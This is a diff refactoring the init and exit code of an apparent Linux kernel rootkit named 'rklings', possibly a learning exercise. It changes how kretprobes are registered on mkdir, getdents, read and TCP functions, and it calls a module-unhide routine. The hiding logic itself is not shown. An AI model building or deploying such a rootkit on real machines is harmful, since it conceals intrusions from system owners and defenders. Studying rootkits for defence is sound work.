@@ -4,6 +4,24 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 
+extern struct kretprobe rk_mkdir_probe;
+extern struct kretprobe rk_mkdirat_probe;
+extern struct kretprobe rk_getdents_probe;
+extern struct kretprobe rk_read_probe;
+extern struct kretprobe rk_tcp4_probe;
+extern struct kretprobe rk_tcp6_probe;
+
+static struct kretprobe *probes[] = {
+	&rk_mkdir_probe,
+	&rk_mkdirat_probe,
+	&rk_getdents_probe,
+	&rk_read_probe,
+	&rk_tcp4_probe,
+	&rk_tcp6_probe,
+};
+
+static int nr_probes;
+
 static int cmd_ping(const char *arg)
 {
 	pr_info("rklings: pong\n");
@@ -16,19 +34,21 @@ static int cmd_status(const char *arg)
 	return 0;
 }
 
+static const struct rk_cmd_entry init_cmds[] = {
+	{ "ping",   cmd_ping },
+	{ "status", cmd_status },
+};
+
 static int __init rk_init(void)
 {
-	int ret;
+	int ret, i;
 
 	rk_target_init(&rk_file_targets);
 	rk_target_init(&rk_pid_targets);
 	rk_target_init(&rk_content_targets);
 	rk_target_init(&rk_port_targets);
 
-	ret = rk_cmd_register("ping", cmd_ping);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("status", cmd_status);
+	ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
 	if (ret)
 		return ret;
 
@@ -48,57 +68,32 @@ static int __init rk_init(void)
 	if (ret)
 		return ret;
 
-	ret = register_kretprobe(&rk_mkdir_probe);
-	if (ret)
-		goto fail_mkdir;
+	for (i = 0; i < ARRAY_SIZE(probes); i++) {
+		ret = register_kretprobe(probes[i]);
+		if (ret)
+			goto fail_probes;
+		nr_probes++;
+	}
 
-	ret = register_kretprobe(&rk_mkdirat_probe);
-	if (ret)
-		goto fail_mkdirat;
-
-	ret = register_kretprobe(&rk_getdents_probe);
-	if (ret)
-		goto fail_getdents;
-
-	ret = register_kretprobe(&rk_read_probe);
-	if (ret)
-		goto fail_read;
-
-	ret = register_kretprobe(&rk_tcp4_probe);
-	if (ret)
-		goto fail_tcp4;
-
-	ret = register_kretprobe(&rk_tcp6_probe);
-	if (ret)
-		goto fail_tcp6;
-
+	pr_info("rklings: loaded\n");
 	return 0;
 
-fail_tcp6:
-	unregister_kretprobe(&rk_tcp4_probe);
-fail_tcp4:
-	unregister_kretprobe(&rk_read_probe);
-fail_read:
-	unregister_kretprobe(&rk_getdents_probe);
-fail_getdents:
-	unregister_kretprobe(&rk_mkdirat_probe);
-fail_mkdirat:
-	unregister_kretprobe(&rk_mkdir_probe);
-fail_mkdir:
+fail_probes:
+	while (nr_probes--)
+		unregister_kretprobe(probes[nr_probes]);
 	rk_proc_exit();
 	return ret;
 }
 
 static void __exit rk_exit(void)
 {
+	int i;
+
 	rk_module_unhide();
-	unregister_kretprobe(&rk_tcp6_probe);
-	unregister_kretprobe(&rk_tcp4_probe);
-	unregister_kretprobe(&rk_read_probe);
-	unregister_kretprobe(&rk_getdents_probe);
-	unregister_kretprobe(&rk_mkdirat_probe);
-	unregister_kretprobe(&rk_mkdir_probe);
+	for (i = nr_probes - 1; i >= 0; i--)
+		unregister_kretprobe(probes[i]);
 	rk_proc_exit();
+	pr_info("rklings: unloaded\n");
 }
 
 module_init(rk_init);
